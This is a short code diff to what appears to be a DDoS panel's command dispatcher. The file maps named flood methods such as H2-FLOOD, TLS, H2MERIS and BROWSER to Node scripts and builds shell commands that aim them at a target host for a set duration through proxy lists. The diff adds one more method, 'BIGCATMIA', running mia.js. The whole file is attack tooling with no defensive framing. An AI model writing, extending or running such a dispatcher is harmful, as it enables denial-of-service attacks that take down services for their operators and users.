@@ -10,6 +10,7 @@ const methods = {
     H2BYPASS: 'H2-BYPASS.js',
     RAW: 'Raw.js',
     TLS: 'tls.js',
+    BIGCATMIA: 'mia.js',
     CATMIA: 'httpgw.js',
     MIXBIL: 'MIXBIL.js',
     H2MERIS: 'H2-MERIS.js',
@@ -27,6 +28,8 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
             return `cd /root/methods && node httpgw.js ${host} ${time} 20 4 proxy.txt`;
+        case 'BIGCATMIA':
+            return `cd /root/methods && node mia.js ${host} ${time} 20 4`;
         case 'TLS':
             return `cd /root/methods && node tls.js ${host} ${time} 64 4 proxy.txt`;
         case 'BROWSER':
